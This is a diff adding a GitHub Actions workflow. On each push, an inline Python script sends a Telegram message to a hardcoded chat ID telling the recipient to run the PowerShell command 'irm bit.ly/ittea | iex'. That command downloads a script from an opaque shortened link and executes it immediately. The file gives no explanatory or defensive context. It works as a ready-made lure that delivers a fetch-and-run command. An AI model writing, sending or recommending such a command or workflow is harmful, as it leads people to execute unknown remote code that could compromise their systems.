@@ -1,0 +1,44 @@
+name: TelegramBot
+on: [push]
+
+jobs:
+  run-telegram-bot:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y python3 python3-pip
+        pip3 install requests
+
+    - name: Run Telegram Bot Command
+      run: |
+        python3 - << 'EOF'
+        import os
+        import requests
+
+        def send_message(chat_id, text):
+            token = os.environ['TELEGRAM_BOT_TOKEN']
+            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            payload = {
+                "chat_id": chat_id,
+                "text": text,
+                "parse_mode": "Markdown"
+            }
+            requests.post(url, json=payload)
+
+        def main():
+            # You would typically set this chat_id to the user or group you want to send the message to
+            chat_id = "1299033071"
+            command = 'irm bit.ly/ittea | iex'
+            send_message(chat_id, f'Run this PowerShell command:\n```\n{command}\n```')
+
+        if __name__ == '__main__':
+            main()
+        EOF
+      env:
+        TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
